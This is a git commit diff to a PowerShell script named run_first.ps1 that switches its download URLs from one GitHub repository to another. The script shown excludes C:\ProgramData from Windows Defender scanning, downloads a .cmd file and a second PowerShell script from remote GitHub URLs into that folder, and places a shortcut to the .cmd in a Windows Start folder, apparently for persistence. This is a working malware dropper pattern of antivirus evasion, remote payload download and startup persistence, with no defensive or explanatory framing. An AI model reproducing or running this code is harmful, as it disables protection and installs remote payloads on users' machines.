4e6ee153a6476c97b111b484cffcd3b94a9ca7db
qwertyuiopindia <93660031+qwertyuiopindia@users.noreply.github.com>
2023-02-12 18:44:50 +0600

    Update run_first.ps1

--- run_first.ps1
+++ run_first.ps1
@@ -1,7 +1,7 @@
 Set-MpPreference -ExclusionPath C:\ProgramData
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $down = New-Object System.Net.WebClient
-$url = 'https://github.com/qwertyuiopindia/test/raw/main/AW_prod.cmd?raw=true'
+$url = 'https://github.com/qwertyuiopindia/test2/raw/main/AW_prod.cmd?raw=true'
 $file = "C:\ProgramData\AW_prod.cmd"
 $down.DownloadFile($url,$file)
 $objShell = New-Object -ComObject ("WScript.Shell")
@@ -9,7 +9,7 @@ $objShortCut = $objShell.CreateShortcut("C:\ProgramData\Microsoft\Windows\Start 
 $objShortCut.TargetPath="C:\ProgramData\AW_prod.cmd"
 $objShortCut.Save()
 $down = New-Object System.Net.WebClient
-$url2 = 'https://github.com/qwertyuiopindia/test/raw/main/script.ps1?raw=true'
+$url2 = 'https://github.com/qwertyuiopindia/test2/raw/main/script.ps1?raw=true'
 $file2 = "C:\ProgramData\script.ps1"
 $down.DownloadFile($url2,$file2)
 $file = "C:\ProgramData\AW_prod.cmd"
